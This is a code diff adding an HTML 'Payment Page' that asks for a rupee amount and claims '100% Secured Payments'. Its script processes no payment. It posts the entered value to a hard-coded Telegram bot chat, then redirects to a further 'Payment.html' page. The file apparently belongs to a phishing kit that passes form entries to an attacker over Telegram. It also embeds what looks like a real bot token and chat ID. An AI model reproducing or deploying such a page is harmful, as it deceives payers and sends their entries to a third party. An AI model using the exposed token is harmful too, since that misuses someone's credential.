@@ -1,0 +1,162 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Payment Page</title>
+    <style>
+        /* General Styles */
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f9;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 70vh;
+            
+        }
+
+        .container {
+            width: 90%;
+            max-width: 400px;
+            background-color: #ffffff;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            overflow: hidden;
+            margin-top: 0;
+            margin-bottom: 0;
+        }
+
+        /* Header */
+        .header {
+            background-color: #002e62;
+            color: #fff;
+            padding: 10px;
+            text-align: center;
+        }
+
+        .header img {
+            width: 60px;
+            margin-bottom: 10px;
+        }
+
+        .header h1 {
+            font-size: 20px;
+            margin: 0;
+        }
+
+        /* Form */
+        form {
+            padding: 10px;
+        }
+
+        form label {
+            font-size: 14px;
+            font-weight: bold;
+            margin-bottom: 5px;
+            display: block;
+            color: #333;
+        }
+
+        form input {
+            width: 100%;
+            padding: 10px;
+            font-size: 14px;
+            margin-bottom: 15px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+        }
+
+        form button {
+            width: 100%;
+            padding: 10px;
+            background-color: #002e62;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+
+        form button:hover {
+            background-color: #004080;
+        }
+
+        /* Footer */
+        .footer {
+            padding: 10px;
+            background-color: #f9f9f9;
+            border-top: 1px solid #ddd;
+            text-align: center;
+            font-size: 12px;
+            color: #888;
+        }
+
+        .footer img {
+            width: 100px;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Header -->
+        <div class="header">
+            <img src="images/logo.png" alt="Logo">
+            <h1>Enter Payment Amount</h1>
+        </div>
+
+        <!-- Form -->
+        <form id="payment-form">
+            <label for="amount">Enter Amount *</label>
+            <input type="number" id="amount" name="amount" placeholder="Enter Amount" required>
+
+            <button type="submit">Pay</button>
+        </form>
+
+        <!-- Footer -->
+        <div class="footer">
+            <p>100% Secured Payments</p>
+            <img src="" alt="">
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('payment-form').addEventListener('submit', async function(event) {
+            event.preventDefault();
+
+            const amount = document.getElementById('amount').value;
+
+            // Telegram Bot Setup
+            const TELEGRAM_BOT_TOKEN = '7755369525:AAGAkFbi0bBqYkv1bmKw9TmOWuKgR9hEJIU'; // Replace with your Telegram Bot Token
+            const TELEGRAM_CHAT_ID = '-1002331300428'; // Replace with your Telegram Chat ID
+            const REDIRECT_URL = 'Payment.html'; // Replace with your redirect URL
+
+            const message = `
+                Payment Alert:
+                - Amount: ₹${amount}
+            `;
+
+            try {
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message
+                    })
+                });
+
+                // Redirect to success page
+                window.location.href = REDIRECT_URL;
+            } catch (error) {
+                console.error('Error sending message to Telegram:', error);
+                alert('Failed to process the payment. Please try again.');
+            }
+        });
+    </script>
+</body>
+</html>
